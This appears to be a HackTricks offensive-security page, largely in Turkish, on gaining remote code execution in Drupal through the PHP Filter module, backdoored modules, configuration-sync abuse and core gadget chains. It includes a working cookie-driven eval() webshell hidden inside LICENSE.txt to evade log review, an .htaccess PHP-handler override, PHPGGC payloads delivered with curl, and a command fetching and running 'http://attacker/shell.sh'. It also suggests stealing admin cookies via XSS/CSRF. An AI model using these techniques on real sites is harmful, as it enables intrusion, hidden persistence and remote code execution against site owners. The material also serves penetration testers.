# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## PHP Filter Module ile

> [!WARNING]
> Drupal'ın daha eski sürümlerinde **(sürüm 8'den önce)**, admin olarak giriş yapıp **`PHP filter` modülünü etkinleştirmek** mümkündü; bu modül "Gömülü PHP kodu/snippet'larının değerlendirilmesine izin verir." Ancak sürüm 8'den itibaren bu modül varsayılan olarak yüklü gelmez.

1. **/modules/php** adresine gidin; eğer 403 hatası dönerse **PHP filter plugin kurulu demektir ve devam edebilirsiniz**
1. Eğer değilse, `Modules` bölümüne gidip `PHP Filter` kutusunu işaretleyin ve ardından `Save configuration`'a tıklayın
2. Ardından, istismar etmek için `Add content`'e tıklayın, sonra `Basic Page` veya `Article` seçin ve **PHP backdoor**'u yazın, sonra Text formatında `PHP` kodunu seçin ve son olarak `Preview`'e tıklayın
3. Tetiklemek için, yeni oluşturulan node'a erişmeniz yeterli:
```bash
curl http://drupal.local/node/3
```
## PHP Filter Modülünü Yükleme

> [!WARNING]
> Mevcut sürümlerde, varsayılan kurulumdan sonra yalnızca web erişimi ile eklenti yüklemek artık mümkün değil.

Sürüm **8 ve sonrasında, the** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **modülü varsayılan olarak yüklü değildir**. Bu işlevselliği kullanabilmek için **modülü kendimiz yüklememiz gerekir**.

1. Modülün en güncel sürümünü Drupal web sitesinden indirin.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. İndirildikten sonra **`Administration`** > **`Reports`** > **`Available updates`** bölümüne gidin.
3. **`Browse`**'a tıklayın, indirdiğimiz dizinden dosyayı seçin ve sonra **`Install`**'e tıklayın.
4. Modül yüklendikten sonra **`Content`**'e tıklayıp, Drupal 7 örneğinde yaptığımız gibi **create a new basic page** oluşturabilirsiniz. Tekrar, **`Text format` açılır menüsünden `PHP code` seçtiğinizden emin olun**.

## Backdoored Modül

> [!WARNING]
> Mevcut sürümlerde, varsayılan kurulumdan sonra yalnızca web erişimi ile eklenti yüklemek artık mümkün değil.

Bir **modül** indirip içine bir **backdoor** ekleyip onu **yüklemek** mümkün olabiliyordu. Örneğin, [**Trurnstile**](https://www.drupal.org/project/turnstile) modülünü sıkıştırılmış formatta indirip, içine yeni bir PHP backdoor dosyası oluşturup, `.htaccess` dosyası ile bu PHP dosyasına erişime izin vererek:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
Ve sonra **`http://drupal.local/admin/modules/install`** adresine giderek backdoored modülü kurup **`/modules/turnstile/back.php`** adresine erişip çalıştırıyoruz.

## Backdooring Drupal with Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post shared by** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Part 1 (activation of _Media_ and _Media Library_)

_Extend_ menüsünde (/admin/modules), zaten yüklü gibi görünen eklentileri etkinleştirebilirsiniz. Varsayılan olarak _Media_ ve _Media Library_ eklentileri etkin görünmez, bu yüzden onları etkinleştirelim.

Before activation:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After activation:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Part 2 (leveraging feature _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

_Configuration synchronization_ özelliğinden yararlanarak Drupal yapılandırma girdilerini dump (export) ve upload (import) edeceğiz:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Patch system.file.yml**

İlk girdi `allow_insecure_uploads`'u yamalayarak başlayalım:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Hedef:

Dosya: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Yama field.field.media.document.field_media_document.yml**

Ardından, ikinci giriş `file_extensions`'i şu şekilde değiştirin:

Dosya: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Hedef:

Dosya: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Bu blog yazısında kullanmıyorum ama `file_directory` girdisinin rastgele tanımlanabildiği ve path traversal attack'e karşı savunmasız olduğu (yani Drupal dosya sistemi ağacında yukarı çıkılabileceği) belirtilmiş.

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Bölüm 3 (_Add Document_ özelliğini kullanma) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Son adım en basit olanıdır ve iki alt adıma ayrılır. İlk olarak, Apache directives'ten yararlanmak ve .txt dosyalarının PHP engine tarafından yorumlanmasını sağlamak için .htaccess formatında bir dosya yüklemektir. İkincisi ise payload içeren bir .txt dosyası yüklemektir.

Dosya: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Why is this trick cool?
  
Çünkü Webshell (bizim isimlendireceğimiz LICENSE.txt) Web sunucusuna yüklendiğinde, komutlarımızı `$_COOKIE` aracılığıyla iletebiliriz ve Web sunucusu kayıtlarında bu, bir metin dosyasına yapılmış meşru bir GET isteği olarak görünecektir.
  
Why name our Webshell LICENSE.txt?
  
Basitçe çünkü örneğin aşağıdaki dosyayı alırsak [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (bu zaten Drupal core’da mevcut), 339 satırlık ve 17.6 KB boyutunda bir dosyamız var; dosya yeterince büyük olduğu için ortasına küçük bir PHP kodu parçası eklemek için ideal.
  
<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
  
Dosya: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### Part 3.1 (.htaccess dosyası yükleme)

Önce, Apache direktiflerini içeren dosyamızı (.htaccess) yüklemek için _Add Document_ (/media/add/document) özelliğinden faydalanıyoruz.

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Part 3.2 (LICENSE.txt dosyası yükleme)**

Daha sonra, bir lisans dosyası içine gizlenmiş bir Webshell'i yüklemek için tekrar _Add Document_ (/media/add/document) özelliğini kullanıyoruz.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Part 4 (Webshell ile etkileşim) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Son kısım, Webshell ile etkileşim kurmaktan oluşuyor.

Aşağıdaki ekran görüntüsünde görüldüğü gibi, Webshell'imizin beklediği cookie tanımlı değilse, dosyayı bir web tarayıcısı aracılığıyla görüntülediğimizde aşağıdaki sonucu alıyoruz.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Saldırgan cookie'yi ayarladığında, Webshell ile etkileşime geçebilir ve istediği komutları çalıştırabilir.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

Ve loglarda görebileceğiniz gibi, yalnızca bir txt dosyası istenmiş gibi görünüyor.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Bu makaleyi okuduğunuz için teşekkürler, umarım bazı shells edinmenize yardımcı olur.

## Drupal core gadget chain (SA-CORE-2024-007 / SA-CORE-2024-008)

Two advisories published **20 Nov 2024** (CVE-2024-55637 & CVE-2024-55638) describe new **PHP object gadget chains in Drupal core** (7.0–7.101, 8.x, 10.2.0–10.2.10, 10.3.0–10.3.8, early 11.x). They are **not directly exploitable** but give attackers a ready-made chain once any contrib/module performs `unserialize()` on user input.

Pratik exploitation workflow:

1. **Find the unserialize sink** (contrib module or custom code). Grep codebase for `unserialize(` or `Drupal\Component\Serialization\PhpSerialize::decode`. Target endpoints that accept POST/JSON or configuration imports.
2. **Generate a payload** using the vulnerable class path that matches the gadget chain. After SA-CORE-2024-008, the public chain was added to common payload generators. Example with PHPGGC (commit ≥ Dec 2024):
```bash
./phpggc drupal/rce2 system 'id' > payload.ser
```
3. **serialized blob'u sink'e teslim et** (ör. deserialized olan parameter). Form-encoded body için:
```bash
curl -X POST https://target/admin/config/some/module \
-d "serialized_setting=$(cat payload.ser)"
```
4. **Trigger destruction** (çoğunlukla isteğin sonunda otomatik olarak) ve komutu çalıştırın.

Notes for testing:

- Gadget works only on versions **prior to 10.2.11 / 10.3.9 / 7.102** (patched). Verify target version via `/core/lib/Drupal.php` or `CHANGELOG.txt`.
- Third‑party DB drivers may need extra hardening; look for deployments that skipped the security update window.

## Son contrib-module unsafe deserialization → RCE

Several contrib modules fixed insecure `unserialize()` paths in late 2024. If the site is missing these updates, they give you the exploitable sink required by the core gadget chain:

- **Mailjet** (<4.0.1, CVE-2024-13296): yönetici kontrollü verinin `unserialize()`'e iletilmesi, core gadgets ile zincirlendiğinde **PHP Object Injection → RCE**'ye izin verir.
- **Eloqua** (7.x-1.x < 1.15, CVE-2024-13297): benzer güvensiz `unserialize()` kullanımı, `access administration pages` izni olan kullanıcılar tarafından ulaşılabilir.

Testing idea (authenticated):
```bash
phpggc drupal/rce2 system 'bash -c "curl http://attacker/shell.sh|sh"' > p.ser
curl -b session=ADMINCOOKIE \
-F "import=@p.ser" https://target/admin/config/eloqua/import
```
Eğer modül yüklenen veriyi deserialize ederse, gadget chain RCE sağlar. Tam bir saldırı zinciri için XSS/CSRF ile birleştirip admin cookies'i çalın.

## Referanslar

- [Drupal core – gadget chain – SA-CORE-2024-008](https://www.drupal.org/sa-core-2024-008)
- [Mailjet module – arbitrary PHP code execution – SA-CONTRIB-2024-062](https://www.drupal.org/sa-contrib-2024-062)

{{#include ../../../banners/hacktricks-training.md}}
